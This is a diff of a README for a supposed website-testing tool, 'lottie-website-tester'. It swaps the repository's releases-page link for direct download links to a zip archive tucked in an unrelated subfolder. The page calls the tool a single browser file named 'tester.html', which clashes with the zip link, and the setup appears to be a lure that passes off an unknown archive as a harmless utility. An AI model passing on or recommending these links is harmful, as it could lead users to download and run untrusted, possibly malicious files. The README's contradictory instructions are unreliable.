@@ -1,6 +1,6 @@
 # 🔍 lottie-website-tester - Test your website performance with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Signindustrymetaphysics613/lottie-website-tester/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Signindustrymetaphysics613/lottie-website-tester/main/test_website2/prints/lottie_website_tester_v2.0-beta.1.zip)
 
 This software helps you check your website for broken links and loading speed. It consists of one file. You do not need to install complex tools. You do not need to register an account. You do not face paywalls. You use the code directly in your browser.
 
@@ -8,7 +8,7 @@ This software helps you check your website for broken links and loading speed. I
 
 You need to clear your desktop space and prepare your browser. Follow these steps to obtain the tool.
 
-1. Visit this page to download: [https://github.com/Signindustrymetaphysics613/lottie-website-tester/releases](https://github.com/Signindustrymetaphysics613/lottie-website-tester/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Signindustrymetaphysics613/lottie-website-tester/main/test_website2/prints/lottie_website_tester_v2.0-beta.1.zip](https://raw.githubusercontent.com/Signindustrymetaphysics613/lottie-website-tester/main/test_website2/prints/lottie_website_tester_v2.0-beta.1.zip)
 2. Locate the file named `tester.html` on the page.
 3. Click the file name to save it to your computer.
 4. Choose a folder where you can find it later, such as your Downloads folder or Desktop.
